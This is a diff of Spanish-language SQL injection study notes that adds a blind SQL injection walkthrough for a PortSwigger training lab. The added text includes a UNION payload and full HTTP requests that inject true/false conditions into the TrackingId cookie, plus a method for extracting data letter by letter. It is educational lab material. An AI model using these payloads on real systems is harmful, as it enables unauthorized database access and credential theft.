@@ -81,7 +81,7 @@ Suponiendo que despues de utilizar la metodologia anterior solo podemos injectar
 ```sql
 ' union select null,CONCAT(COLUMNA 1,':',COLUMNA 2) from TABLA-- -
 ```
-## Metodologia inyección a ciegas (Blind SQL injection)
+## Blind SQL injection conditional responses
 En un ataque blind SQL injection el atacante explora la base de datos mediante consultas que, dependiendo de la respuesta del servidor (como respuestas verdaderas o falsas), le permiten inferir datos confidenciales o estructura de la base de datos sin acceder directamente a los resultados.
 
 Ejemplo: El laboratorio https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
@@ -91,3 +91,39 @@ Ejemplo: El laboratorio https://portswigger.net/web-security/sql-injection/blind
 The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
 
 The database contains a different table called ```users```, with columns called ```username``` and ```password```. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. "
+
+En la siguiente peticion recibimos el mensaje "Welcome back"
+```http
+GET / HTTP/2
+Host: 0a6f0036037b631e8c38b2a0004e009e.web-security-academy.net
+Cookie: TrackingId=iYMM1GrXuxAnojK7' and 1=1-- -; session=MVg9****
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+Y en esta no recibimos el mensaje "Welcome back"
+```http
+GET / HTTP/2
+Host: 0a6f0036037b631e8c38b2a0004e009e.web-security-academy.net
+Cookie: TrackingId=iYMM1GrXuxAnojK7' and 1=2-- -; session=MVg9****
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+Por lo que podemos inferir que si una consulta es verdadera recibimos el mensaje "Welcome back" y si es falsa no lo recibimos, aunque podemos observar un patron de comportamiento por parte del servidor, aun asi no podemos ver ningun tipo de informacion en nuestras consultas por lo que temos que extraer la informacion letra por letra utilizando la funcion SUBSTRING().
